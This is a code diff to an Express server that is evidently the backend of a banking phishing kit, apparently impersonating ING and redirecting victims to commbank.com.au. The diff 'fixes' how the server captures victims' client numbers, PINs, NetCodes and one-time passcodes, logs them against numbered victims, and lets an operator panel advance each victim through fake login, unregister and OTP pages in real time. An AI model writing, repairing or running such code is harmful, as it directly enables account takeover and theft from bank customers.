@@ -219,18 +219,19 @@ function uaParser(ua) {
   return u;
 }
 
-/* ----------  SESSION HEADER HELPER - FIXED FOR NETCODE ---------- */
+/* ----------  SESSION HEADER HELPER - FIXED FOR OTP ---------- */
 function getSessionHeader(v) {
   // Approved/Success state
-  if (v.page === 'success' || v.status === 'ok' || v.status === 'approved') return `🦁 ING Login approved`;
+  if (v.page === 'success' || v.status === 'approved') return `🦁 ING Login approved`;
   
   // index.html page (initial login)
   if (v.page === 'index.html') {
     return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
   } 
   
-  // verify.html page (NetCode entry) - THIS IS THE FINAL STEP
+  // verify.html page (NetCode/OTP entry)
   else if (v.page === 'verify.html') {
+    // Note: verify.html sends the NetCode to /api/verify which stores it in v.phone
     return v.phone ? `🔑 Received NetCode: ${v.phone}` : `⏳ Awaiting NetCode`;
   } 
   
@@ -239,13 +240,15 @@ function getSessionHeader(v) {
     return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
   } 
   
-  // otp.html page (if used)
+  // otp.html page - THIS IS THE FIX: Check for OTP field
   else if (v.page === 'otp.html') {
     if (v.otp && v.otp.length > 0) return `🔑 Received OTP: ${v.otp}`;
     return `⏳ Awaiting OTP...`;
   }
   
-  // Default fallback
+  // Default fallback - also check if OTP exists on any page
+  if (v.otp && v.otp.length > 0) return `🔑 Received OTP: ${v.otp}`;
+  
   return `⏳ Waiting...`;
 }
 
@@ -322,8 +325,7 @@ app.post('/api/verify', async (req, res) => {
     if (!phone?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-    v.phone = phone; 
-    v.status = 'wait';
+    v.phone = phone; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
@@ -334,7 +336,7 @@ app.post('/api/verify', async (req, res) => {
     res.sendStatus(200);
   } catch (e) {
     console.error('Verify error', e);
-    res.status(500).send('Error');
+    res.sendStatus(500);
   }
 });
 
@@ -356,6 +358,7 @@ app.post('/api/unregister', async (req, res) => {
   }
 });
 
+// FIXED: /api/otp now properly stores OTP and logs it
 app.post('/api/otp', async (req, res) => {
   try {
     const { sid, otp } = req.body;
@@ -372,10 +375,21 @@ app.post('/api/otp', async (req, res) => {
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
 
+    // Also update audit log
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) {
       entry.otp = otp;
+      console.log(`[DEBUG] OTP saved to audit log for victim ${entry.victimN}`);
+    } else {
+      console.log(`[DEBUG] No audit log entry found for sid: ${sid}`);
     }
+    
+    console.log(`[DEBUG] OTP stored successfully. Current victim data:`, {
+      sid: v.sid,
+      page: v.page,
+      otp: v.otp,
+      status: v.status
+    });
     
     res.sendStatus(200);
   } catch (err) {
@@ -475,7 +489,6 @@ app.get('/api/panel', (req, res) => {
   res.json(buildPanelPayload());
 });
 
-// FIXED: /api/panel POST - handle verify.html as final step
 app.post('/api/panel', async (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
@@ -485,8 +498,6 @@ app.post('/api/panel', async (req, res) => {
   const { action, sid } = req.body;
   const v = sessionsMap.get(sid);
   if (!v) return res.status(404).json({ ok: false });
-
-  console.log(`[DEBUG] Panel action: ${action}, sid: ${sid}, current page: ${v.page}, status: ${v.status}`);
 
   switch (action) {
     case 'redo':
@@ -499,34 +510,25 @@ app.post('/api/panel', async (req, res) => {
       }
       break;
     case 'cont':
-      // KEY FIX: verify.html is the FINAL step - clicking Continue approves and redirects
-      if (v.page === 'index.html') {
-        v.page = 'verify.html';
-        v.status = 'wait';
-      }
+      v.status = 'ok';
+      if (v.page === 'index.html') v.page = 'verify.html';
       else if (v.page === 'verify.html') {
-        // FINAL STEP: Set status to 'ok' so victim gets redirected to commbank.com.au
+        // Mark as successful and approved when continuing from verify.html
         v.page = 'success';
-        v.status = 'ok';  // <-- THIS IS THE KEY FIX: status 'ok' triggers redirect on verify.html
+        v.status = 'approved';
         successfulLogins++;
-        console.log(`[DEBUG] Login approved for victim ${v.victimNum} from verify.html, status set to 'ok'`);
       }
-      else if (v.page === 'unregister.html') {
-        v.page = 'otp.html';
-        v.status = 'wait';
-      }
+      else if (v.page === 'unregister.html') v.page = 'otp.html';
       else if (v.page === 'otp.html') { 
-        v.page = 'success';
-        v.status = 'ok';
-        successfulLogins++;
+        v.page = 'success'; 
+        v.status = 'approved';
+        successfulLogins++; 
       }
       break;
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
       break;
   }
-  
-  console.log(`[DEBUG] After action: page=${v.page}, status=${v.status}`);
   res.json({ ok: true });
 });
 
